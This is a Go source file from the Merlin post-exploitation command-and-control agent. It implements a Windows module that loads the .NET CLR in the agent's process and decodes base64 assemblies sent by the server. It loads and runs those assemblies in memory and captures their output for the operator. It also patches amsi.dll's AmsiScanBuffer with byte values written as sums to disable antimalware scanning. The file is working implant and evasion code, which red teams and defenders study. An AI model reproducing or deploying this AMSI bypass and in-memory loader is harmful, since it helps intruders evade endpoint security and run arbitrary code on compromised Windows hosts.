//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"encoding/base64"
	"fmt"
	"strings"

	// 3rd Party
	clr "github.com/Ne0nd0g/go-clr"

	// Merlin Main
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/evasion"
)

// runtimeHost is the main object used to interact with the CLR to load and invoke assemblies
var runtimeHost *clr.ICORRuntimeHost

// assemblies is a list of the loaded assemblies that can be invoked
var assemblies = make(map[string]assembly)

// redirected tracks if STDOUT/STDERR have been redirected for the CLR so that they can be captured
// and send back to the server
var redirected bool

var patched bool

// assembly is a structure to represent a loaded assembly that can subsequently be invoked
type assembly struct {
	name       string
	version    string
	methodInfo *clr.MethodInfo
}

// CLR is the entrypoint for Jobs that are processed to determine which CLR function should be executed
func CLR(cmd jobs.Command) jobs.Results {
	clr.Debug = core.Debug
	if len(cmd.Args) > 0 {
		cli.Message(cli.SUCCESS, fmt.Sprintf("CLR module command: %s", cmd.Args[0]))
		switch strings.ToLower(cmd.Args[0]) {
		case "start":
			return startCLR(cmd.Args[1])
		case "list-assemblies":
			return listAssemblies()
		case "load-assembly":
			return loadAssembly(cmd.Args[1:])
		case "load-clr":
			return startCLR(cmd.Args[1])
		case "invoke-assembly":
			return invokeAssembly(cmd.Args[1:])
		default:
			j := jobs.Results{
				Stderr: fmt.Sprintf("unrecognized CLR command: %s", cmd.Args[0]),
			}
			return j
		}
	}
	j := jobs.Results{
		Stderr: "no arguments were provided to the CLR module",
	}
	return j
}

// startCLR loads the CLR runtime version number from Args[0] into the current process
func startCLR(runtime string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for startCLR function: %s", runtime))

	var err error
	// Redirect STDOUT/STDERR so it can be captured
	if !redirected {
		err = clr.RedirectStdoutStderr()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error redirecting STDOUT/STDERR:\n%s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}
	}

	// Load the CLR and an ICORRuntimeHost instance
	if runtime == "" {
		runtime = "v4"
	}
	runtimeHost, err = clr.LoadCLR(runtime)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling the startCLR function:\n%s", err)
		cli.Message(cli.WARN, results.Stderr)
		return
	}
	results.Stdout = fmt.Sprintf("\nThe %s .NET CLR runtime was successfully loaded", runtime)

	// Patch AMSI ScanBuffer
	if !patched {
		patch := []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
		out, err := evasion.Patch("amsi.dll", "AmsiScanBuffer", &patch)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error patching the amsi!ScanBuffer function: %s", err)
		} else {
			results.Stdout += fmt.Sprintf("\n%s", out)
			patched = true
		}

	}

	cli.Message(cli.SUCCESS, results.Stdout)
	return
}

// loadAssembly loads an assembly into the runtimeHost's default AppDomain
func loadAssembly(args []string) (results jobs.Results) {
	cli.Message(cli.DEBUG, "Entering into clr.loadAssembly()...")
	//cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for loadAssembly function: %+v", args))
	if len(args) > 1 {
		var a assembly
		a.name = strings.ToLower(args[1])
		for _, v := range assemblies {
			if v.name == a.name {
				results.Stderr = fmt.Sprintf("the '%s' assembly is already loaded", a.name)
				cli.Message(cli.WARN, results.Stderr)
				return
			}
		}

		// Load the v4 runtime if there are not any runtimes currently loaded
		if runtimeHost == nil {
			results = startCLR("")
			if results.Stderr != "" {
				return
			}
		}

		// Base64 decode Arg[1], the assembly bytes
		assembly, err := base64.StdEncoding.DecodeString(args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there  was an error decoding the Base64 string: %s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}

		// Load the assembly
		a.methodInfo, err = clr.LoadAssembly(runtimeHost, assembly)
		if err != nil {
			// HRESULT: 0x8007000b COR_E_BADIMAGEFORMAT
			// https://referencesource.microsoft.com/#mscorlib/system/__hresults.cs,7041cd5c9aa1948b,references
			results.Stderr = fmt.Sprintf("there was an error calling the loadAssembly function:\n%s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}

		assemblies[a.name] = a
		results.Stdout += fmt.Sprintf("\nSuccessfully loaded %s into the default AppDomain", a.name)
		cli.Message(cli.SUCCESS, results.Stdout)
		return
	}
	results.Stderr = fmt.Sprintf("expected 2 arguments for the load-assembly command, received %d", len(args))
	cli.Message(cli.WARN, results.Stderr)
	return
}

// invokeAssembly executes a previously loaded assembly
func invokeAssembly(args []string) (results jobs.Results) {
	cli.Message(cli.DEBUG, "Entering into clr.invokeAssembly()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for invokeAssembly function: %+v", args))
	cli.Message(cli.NOTE, fmt.Sprintf("Invoking .NET assembly: %s", args))
	if len(args) > 0 {
		var isLoaded bool
		var a assembly
		for _, v := range assemblies {
			if v.name == strings.ToLower(args[0]) {
				isLoaded = true
				a = v
			}
		}
		if isLoaded {
			// Setup OS environment, if any
			err := Setup()
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			defer TearDown()
			core.Mutex.Lock()
			results.Stdout, results.Stderr = clr.InvokeAssembly(a.methodInfo, args[1:])
			core.Mutex.Unlock()
			cli.Message(cli.DEBUG, "Leaving clr.invokeAssembly() function without error")
			return
		}
		results.Stderr = fmt.Sprintf("the '%s' assembly is not loaded", args[0])
		cli.Message(cli.WARN, results.Stderr)
		return
	}
	results.Stderr = fmt.Sprintf("expected at least 1 arguments for the invokeAssembly function, received %d", len(args))
	cli.Message(cli.WARN, results.Stderr)
	return
}

// listAssemblies enumerates the loaded .NET assemblies and returns them
func listAssemblies() (results jobs.Results) {
	results.Stdout = "Loaded Assemblies:\n"
	for _, v := range assemblies {
		results.Stdout += fmt.Sprintf("%s\n", v.name)
	}
	cli.Message(cli.SUCCESS, results.Stdout)
	return
}
